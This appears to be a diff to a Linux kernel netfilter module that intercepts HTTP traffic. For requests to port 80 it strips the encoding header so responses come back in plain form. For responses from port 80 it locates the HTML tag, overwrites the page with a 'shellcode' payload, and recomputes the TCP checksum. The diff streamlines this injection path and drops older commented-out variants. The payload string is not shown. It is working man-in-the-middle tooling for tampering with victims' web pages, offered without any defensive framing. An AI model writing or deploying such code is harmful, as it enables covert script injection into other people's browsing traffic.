@@ -5,6 +5,18 @@
 #include <linux/tcp.h>
 #include <linux/inet.h>
 #include <linux/if_packet.h>
+#include <linux/socket.h>
+#include <linux/skbuff.h>
+
+#include <net/ip.h>
+#include <net/tcp.h>
+
+#include <net/sock.h>
+#include <net/netfilter/nf_nat.h>
+#include <net/netfilter/nf_nat_helper.h>
+#include <net/netfilter/nf_conntrack.h>
+#include <net/netfilter/nf_conntrack_helper.h>
+#include <net/netfilter/nf_conntrack_expect.h>
 
 static struct nf_hook_ops nfho;
 
@@ -43,7 +55,7 @@ unsigned short checksum(unsigned short *addr, int len) {
 	return (answer);
 }
 
-unsigned short checksum_tcp(struct iphdr *ip_hd, struct tcphdr *tcp_hd)
+unsigned short checksum_tcp(struct iphdr *ip_hd, struct tcphdr *tcph)
 {
 	unsigned short tcp_len;
 	unsigned short ret = 0;
@@ -64,9 +76,9 @@ unsigned short checksum_tcp(struct iphdr *ip_hd, struct tcphdr *tcp_hd)
 	phd->res = 0;
 	phd->proto = IPPROTO_TCP;
 	phd->len = htons(tcp_len);
-	memcpy(buf+sizeof(pse_hd),tcp_hd,tcp_len);
-	tcp_hd = (struct tcphdr *)(buf+sizeof(pse_hd));
-	tcp_hd->check = 0;
+	memcpy(buf+sizeof(pse_hd),tcph,tcp_len);
+	tcph = (struct tcphdr *)(buf+sizeof(pse_hd));
+	tcph->check = 0;
 	ret = checksum((unsigned short *)buf, tcp_len+sizeof(pse_hd));
 	kfree(buf);
 	return ret; 
@@ -107,43 +119,10 @@ int check_insert(char *pkg)
 	}
 
 	printk(KERN_ALERT "hook_ipv4: HTML tag found\n");
-	
-	// pbody = strstr(phtml,"<body");
-	// if(pbody != NULL)
-	// {
-	// 	printk(KERN_ALERT "hook_ipv4: BODY tag found\n");
-	// 	max_size = (long long)pbody - (long long)phtml;
-	// 	if(max_size < strlen(shellcode))
-	// 		return 0;
 		
-	// 	memcpy(pbody - strlen(shellcode) - 1,shellcode,strlen(shellcode));
-	// 	*(char *)(pbody - strlen(shellcode) - 2) = '>';
-	// }
-	// else
-	// {
-	// 	ptemp = strstr(phtml,"charset");
-		
-		
-	// 	if(ptemp != NULL)
-	// 	{
-	// 		len = (long long)ptemp - (long long)phtml;
-	// 		if(len <= 20)
-	// 		{
-	// 			ptemp = strstr(ptemp,">");
-	// 			if(ptemp != NULL)
-	// 			{
-	// 				ptemp++;
-	// 				memcpy(ptemp,shellcode,strlen(shellcode));
-	// 				delete_padding(ptemp + strlen(shellcode));
-	// 				return 1;
-	// 			}
-	// 		}
-	// 	}
-		
-		phtml[0] = '>';
-		memcpy(phtml + 1,shellcode,strlen(shellcode));
-		delete_padding(phtml + 1 + strlen(shellcode));
-	// }
+	phtml[0] = '>';
+	memcpy(phtml + 1,shellcode,strlen(shellcode));
+	delete_padding(phtml + 1 + strlen(shellcode));
 	
 	return 1;
 }
@@ -174,30 +153,20 @@ int delete_encoding(char *pkg)
 
 unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
 {
-	//char head_data[9] = {0};
-	//int i;
-	unsigned short cs= 0;
-	unsigned int src_ip, dest_ip;
-	unsigned int src_port, dest_port;
-	unsigned short totlen = 0;
-	unsigned short data_len = 0;
-	char *pkg = NULL;
+	struct iphdr *iph = ip_hdr(skb);
+	unsigned short iph_len = ip_hdrlen(skb);
+	unsigned short tol_len = ntohs(iph->tot_len);
 
-	struct tcphdr *tcp_hd = NULL;
-
-	struct iphdr *ip_header = (struct iphdr *)skb_network_header(skb);
-	totlen = ntohs(ip_header->tot_len);
-	if (ip_header->protocol == IPPROTO_TCP)
+	if (iph->protocol == IPPROTO_TCP)
 	{
-		tcp_hd = (struct tcphdr *)((__u32 *)ip_header+ ip_header->ihl);
-		src_ip = (unsigned int)ip_header->saddr;
-		dest_ip = (unsigned int)ip_header->daddr;
+		struct tcphdr *tcph = tcp_hdr(skb);
+		unsigned int src_ip = (unsigned int)iph->saddr;
+		unsigned int dest_ip = (unsigned int)iph->daddr;
 
-		pkg = (char *)((long long)tcp_hd + ((tcp_hd->doff) * 4));
-		data_len = totlen - ((long long)pkg - (long long)ip_header);
+		unsigned int src_port = (unsigned int)ntohs(tcph->source);
+		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
 
-		src_port = (unsigned int)ntohs(tcp_hd->source);
-		dest_port = (unsigned int)ntohs(tcp_hd->dest);
+		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
 		
 		if (src_port == 80)
 		{
@@ -210,12 +179,8 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 			if(check_insert(pkg))
 			{
 				printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);
-
 				printk(KERN_ALERT "hook_ipv4: Insert success\n");
 			}
-
-			cs = checksum_tcp(ip_header, tcp_hd);
-			tcp_hd->check = cs;
 		}
 		else if (dest_port == 80)
 		{
@@ -225,13 +190,10 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 			}
 			
 			delete_encoding(pkg);
-			cs = checksum_tcp(ip_header, tcp_hd);
-			tcp_hd->check = cs;
 		}
-		else
-		{
-			return NF_ACCEPT;
-		}
+
+		unsigned short cs = checksum_tcp(iph, tcph);
+		tcph->check = cs;
 	}
 	return NF_ACCEPT;
 }
@@ -241,7 +203,7 @@ int init_module(void)
 	nfho.hook = hook_func;
 	nfho.hooknum = NF_INET_PRE_ROUTING;
 	nfho.pf = PF_INET;
-	nfho.priority = NF_IP_PRI_FIRST;
+	nfho.priority = NF_IP_PRI_MANGLE;
 	nf_register_hook(&nfho);
 	printk(KERN_ALERT "hook_ipv4: insmod\n");
 
